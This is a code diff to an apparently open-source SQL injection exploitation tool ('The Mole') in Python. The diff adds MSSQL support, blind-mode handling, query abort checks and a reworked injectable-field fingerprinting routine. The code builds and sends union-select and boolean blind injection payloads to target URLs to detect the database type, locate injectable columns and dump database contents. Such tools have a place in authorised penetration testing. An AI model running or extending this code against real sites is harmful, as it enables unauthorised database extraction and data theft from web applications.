@@ -23,7 +23,7 @@
 # Gastón Traberg
 
 from domanalyser import DomAnalyser,NeedleNotFound
-from dbmsmoles import DbmsMole, Mysql5Mole, PostgresMole
+from dbmsmoles import DbmsMole, Mysql5Mole, PostgresMole, MssqlMole
 from dbdump import DatabaseDump
 from threader import Threader
 from output import BlindSQLIOutput
@@ -35,9 +35,9 @@ class TheMole:
     field = '[_SQL_Field_]'
     table = '[_SQL_Table_]'
     
-    dbms_mole_list = [Mysql5Mole, PostgresMole]
+    dbms_mole_list = [Mysql5Mole, PostgresMole, MssqlMole]
     
-    def __init__(self, max_threads = 4):
+    def __init__(self, threads = 4):
         self.initialized = False
         self.needle = None
         self.url = None
@@ -45,7 +45,7 @@ class TheMole:
         self.wildcard = None
         self.mode = 'union'
         self.end = ' '
-        self.threader = Threader(max_threads)
+        self.threader = Threader(threads)
     
     def restart(self):
         self.initialized = False
@@ -62,6 +62,7 @@ class TheMole:
             raise MoleAttributeRequired('Attribute needle is required')
         self.separator = ''
         self.comment = ''
+        self.end = ' '
         self.parenthesis = 0
         self.database_dump = DatabaseDump()
         
@@ -108,15 +109,24 @@ class TheMole:
         self.initialized = True
 
     def generate_url(self, injection_string):
-        return self.url.replace(self.wildcard,
-                                injection_string.format(sep=self.separator,
-                                                        com=self.comment,
-                                                        par=(self.parenthesis * ')'),
-                                                        end=self.end)
-                                )
+        return self.url.replace(
+                self.wildcard,
+                injection_string.format(sep=self.separator,
+                                        com=self.comment,
+                                        par=(self.parenthesis * ')'),
+                end=self.end)
+        )
     
     def get_requester(self):
         return self.requester
+        
+    def set_mode(self, mode):
+        if mode == 'blind':
+            if self.initialized and self.separator != ' ':
+                self.end =  'and {sep}{sep}={sep}'.format(sep=self.separator)
+        else:
+            self.initialized = False
+        self.mode = mode
     
     def poll_databases(self):
         if self.database_dump.db_map:
@@ -126,9 +136,10 @@ class TheMole:
 
     def abort_query(self):
         self.stop_query = True
-        self.threader.stop()
 
     def _generic_query_item(self, query_generator, offset, result_parser = lambda x: x[0]):
+        if self.stop_query:
+            return None
         req = self.get_requester().request(self.generate_url(query_generator(offset)))
         result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
         if not result or len(result) < 1:
@@ -140,11 +151,14 @@ class TheMole:
         req = self.get_requester().request(self.generate_url(count_query))
         result = self._dbms_mole.parse_results(self.analyser.decode(req))
         if not result or len(result) != 1:
-            raise QueryError()
+            raise QueryError('Count query failed.')
         else:
+            count = int(result[0])
+            if count == 0:
+                return []
             dump_result = []
             self.stop_query = False
-            dump_result = self.threader.execute(int(result[0]), lambda i: self._generic_query_item(query_generator, i, result_parser))
+            dump_result = self.threader.execute(count, lambda i: self._generic_query_item(query_generator, i, result_parser))
             dump_result.sort()
             return dump_result
 
@@ -263,8 +277,8 @@ class TheMole:
             return data
 
     def _generic_blind_len(self, count_fun, trying_msg, max_msg):
-        length=0
-        last =1
+        length = 0
+        last = 1
         while True and not self.stop_query:
             req = self.get_requester().request(
                 self.generate_url(
@@ -300,6 +314,8 @@ class TheMole:
         last  = 126
         index = index + 1
         while True:
+            if self.stop_query:
+                return None
             medio = (pri + last)//2
             response = self.analyser.decode(
                 self.requester.request(
@@ -366,7 +382,7 @@ class TheMole:
         if not separator:
             raise SQLInjectionNotDetected()
         print('[+] Found separator: "' + self.separator + '"')
-        #Validate the negation of the query
+        # Validate the negation of the query
         req = self.get_requester().request(
             self.generate_url('{sep}{par} and {sep}1{sep} = {sep}0')
         )
@@ -445,36 +461,38 @@ class TheMole:
         used_hashes = set()
         base = 714
         for mole in TheMole.dbms_mole_list:
-            hashes, to_search_hashes = mole.injectable_field_finger(self.query_columns, base)
-            hash_string = ",".join(hashes)
-            if not hash_string in used_hashes:
-                req = self.get_requester().request(
-                        self.generate_url(
-                            "{sep}{par} and 1=0 union all select " + hash_string + " {com}"
-                        )
-                    ).decode(self.analyser.encoding)
-                try:
-                    self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
-                    print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), self.injectable_fields)) + "]")
-                    self._filter_injectable_fields()
-                    return
-                except Exception as ex:
-                    print(ex)
-                    used_hashes.add(hash_string)                
+            fingers = mole.injectable_field_fingers(self.query_columns, base)
+            for i in fingers:
+                hashes, to_search_hashes = i
+                hash_string = ",".join(hashes)
+                if not hash_string in used_hashes:
+                    req = self.get_requester().request(
+                            self.generate_url(
+                                "{sep}{par} and 1=0 union all select " + hash_string + " {com}"
+                            )
+                        ).decode(self.analyser.encoding)
+                    try:
+                        self.injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
+                        if len(self.injectable_fields) > 0:
+                            print("[+] Injectable fields found: [" + ', '.join(map(lambda x: str(x + 1), self.injectable_fields)) + "]")
+                            if self._filter_injectable_fields(mole):
+                                return
+                    except Exception as ex:
+                        print(ex)
+                        used_hashes.add(hash_string)                
         raise SQLInjectionNotExploitable()
 
-    def _filter_injectable_fields(self):
+    def _filter_injectable_fields(self, dbms_mole_class):
         for field in self.injectable_fields:
             print('[i] Trying field', field + 1)
-            for dbms_mole_class in TheMole.dbms_mole_list:
-                query = dbms_mole_class.field_finger_query(self.query_columns, field)
-                url_query = self.generate_url(query)
-                req = self.get_requester().request(url_query)
-                if dbms_mole_class.field_finger() in self.analyser.decode(req):
-                    self.injectable_field = field
-                    print('[+] Found injectable field:', field + 1)
-                    return
-        raise Exception('[-] Could not inject.')
+            query = dbms_mole_class.field_finger_query(self.query_columns, field)
+            url_query = self.generate_url(query)
+            req = self.get_requester().request(url_query)
+            if dbms_mole_class.field_finger() in self.analyser.decode(req):
+                self.injectable_field = field
+                print('[+] Found injectable field:', field + 1)
+                return True
+        return False
 
     def _detect_dbms(self):
         for dbms_mole_class in TheMole.dbms_mole_list:
@@ -500,20 +518,6 @@ class TheMole:
         raise Exception('[-] Could not detect DBMS')
 
 
-class TableNotDumped(Exception):
-    pass
-
-class ColumnsNotDumped(Exception):
-    pass
-
-class TableNotFound(Exception):
-    pass
-
-class DatabaseNotFound(Exception):
-    pass
-
-class DatabasesNotDumped(Exception):
-    pass
 
 class SQLInjectionNotDetected(Exception):
     pass
